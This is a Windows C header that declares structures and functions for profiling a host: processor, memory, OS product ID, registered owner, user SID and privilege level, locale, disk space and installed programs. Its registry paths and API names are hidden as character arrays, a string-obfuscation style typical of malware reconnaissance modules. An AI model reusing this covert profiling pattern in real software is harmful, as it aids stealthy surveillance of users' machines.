#include <Windows.h>

#ifndef _DEVICE_H
#define _DEVICE_H

#define SOFTW_MICROS_WINNT_CURRVER { L'S', L'O', L'F', L'T', L'W', L'A', L'R', L'E', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L' ', L'N', L'T', L'\\', L'C', L'u', L'r', L'r', L'e', L'n', L't', L'V', L'e', L'r', L's', L'i', L'o', L'n', L'\0' };
#define HWD_DESC_SYS_CENTRALPROC_0 { L'H', L'A', L'R', L'D', L'W', L'A', L'R', L'E', L'\\', L'D', L'E', L'S', L'C', L'R', L'I', L'P', L'T', L'I', L'O', L'N', L'\\', L'S', L'y', L's', L't', L'e', L'm', L'\\', L'C', L'e', L'n', L't', L'r', L'a', L'l', L'P', L'r', L'o', L'c', L'e', L's', L's', L'o', L'r', '\\', '0', L'\0' };
#define SYSTEM_CURRCON_CONTROL_TIMEZONE { L'S', L'Y', L'S', L'T', L'E', L'M', L'\\', L'C', L'u', L'r', L'r', L'e', L'n', L't', L'C', L'o', L'n', L't', L'r', L'o', L'l', L'S', L'e', L't', L'\\', L'C', L'o', L'n', L't', L'r', L'o', L'l', L'\\', L'T', L'i', L'm', L'e', L'Z', L'o', L'n', L'e', L'I', L'n', L'f', L'o', L'r', L'm', L'a', L't', L'i', L'o', L'n', L'\0', };
#define SOFTWARE_MICROSOFT_WIN_CURR_UNINSTALL { L'S', L'O', L'F', L'T', L'W', L'A', L'R', L'E', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', L'C', L'u', L'r', L'r', L'e', L'n', L't', L'V', L'e', L'r', L's', L'i', L'o', L'n', L'\\', L'U', L'n', L'i', L'n', L's', L't', L'a', L'l', L'l', L'\0' };

#define PROCESSOR_NAME_STRING { L'P', L'r', L'o', L'c', L'e', L's', L's', L'o', L'r', L'N', L'a', L'm', L'e', L'S', L't', L'r', L'i', L'n', L'g', L'\0' };
#define PRODUCT_NAME { L'P', L'r', L'o', L'd', L'u', L'c', L't', L'N', L'a', L'm', L'e', L'\0' };
#define CSD_VERSION { L'C', L'S', L'D', L'V', L'e', L'r', L's', L'i', L'o', L'n', L'\0' };
#define PRODUCT_ID { L'P', L'r', L'o', L'd', L'u', L'c', L't', L'I', L'd', L'\0' };
#define REGISTERED_OWNER { L'R', L'e', L'g', L'i', L's', L't', L'e', L'r', L'e', L'd', L'O', L'w', L'n', L'e', L'r', L'\0' };
#define REGISTERED_ORG { L'R', L'e', L'g', L'i', L's', L't', L'e', L'r', L'e', L'd', L'O', L'r', L'g', L'a', L'n', L'i', L'z', L'a', L't', L'i', L'o', L'n', L'\0' };
#define ACTIVE_TIME_BIAS { L'A', L'c', L't', L'i', L'v', L'e', L'T', L'i', L'm', L'e', L'B', L'i', L'a', L's', L'\0' };
#define PARENT_KEY_NAME { 'P', L'a', L'r', L'e', L'n', L't', L'K', L'e', L'y', L'N', L'a', L'm', L'e', L'\0' };
#define SYSTEM_COMPONENT { L'S', L'y', L's', L't', L'e', L'm', L'C', L'o', L'm', L'p', L'o', L'n', L'e', L'n', L't', L'\0' };
#define DISPLAY_NAME { L'D', L'i', L's', L'p', L'l', L'a', L'y', L'N', L'a', L'm', L'e', L'\0' };
#define DISPLAY_VERSION { L'D', L'i', L's', L'p', L'l', L'a', L'y', L'V', L'e', L'r', L's', L'i', L'o', L'n', L'\0' };


#define NETAPI32 { L'N', L'e', L't', L'a', L'p', L'i', L'3', L'2', L'\0' };
#define NETUSERGETINFO { L'N', L'e', L't', L'U', L's', L'e', L'r', L'G', L'e', L't', L'I', L'n', L'f', L'o', L'\0' };
#define NETAPIBUFFERFREE { 'N', 'e', 't', 'A', 'p', 'i', 'B', 'u', 'f', 'f', 'e', 'r', 'F', 'r', 'e', 'e', 0x0 };
#define GETDISKFREESPACEEX { 'G', 'e', 't', 'D', 'i', 's', 'k', 'F', 'r', 'e', 'e', 'S', 'p', 'a', 'c', 'e', 'E', 'x', 'W', 0x0 };

#define APPLICATION_LIST_X86 { L'A', L'p', L'p', L'l', L'i', L'c', L'a', L't', L'i', L'o', L'n', L' ', L'L', L'i', L's', L't', L' ', L'(', L'x', L'8', L'6', L')', L':', L'\n', L'\n', L'\0' }
#define APPLICATION_LIST_X64 { L'A', L'p', L'p', L'l', L'i', L'c', L'a', L't', L'i', L'o', L'n', L' ', L'L', L'i', L's', L't', L' ', L'(', L'x', L'6', L'4', L')', L':', L'\n', L'\n', L'\0' }

typedef struct _DEVICE_INFO
{
	struct {
		WCHAR proc[128];		// Processor description
		ULONG procnum;			// Number of processors
	} procinfo;
	struct {
		ULONG memtotal;			// Total physical memory (MB)
		ULONG memfree;			// Free physical memory (MB)
		DWORD memload;			// Memory load percentage
	} meminfo;
	struct {
		WCHAR ver[64];			// Windows version description
		WCHAR sp[64];			// Windows service pack description
		WCHAR id[64];			// Windows product ID
		WCHAR owner[64];		// Registered owner
		WCHAR org[64];			// Registered organization
	} osinfo;
	struct {
		WCHAR username[64];		// Name
		WCHAR fullname[64];		// Fullname
		WCHAR sid[64];			// SID
		ULONG priv;				// Privilege level (USER_PRIV_GUEST, USER_PRIV_USER, USER_PRIV_ADMIN)
	} userinfo;
	struct {
		ULONG timebias;			// Time bias from UTC (min)
		WCHAR lang[16];			// Language name
		WCHAR country[16];		// Country name
	} localinfo;
	struct {
		ULONG disktotal;		// Total disk space (MB)
		ULONG diskfree;			// Free disk space (MB)
	} diskinfo;
} DEVICE_INFO, *PDEVICE_INFO;

typedef struct _DEVICE_CONTAINER
{
	ULONG uSize;
	LPWSTR pDataBuffer;
} DEVICE_CONTAINER, *PDEVICE_CONTAINER;

VOID GetDeviceInfo();
LPWSTR GetApplicationList(BOOL bX64View);
VOID IsX64System(PBOOL bIsWow64, PBOOL bIsx64OS);

#endif


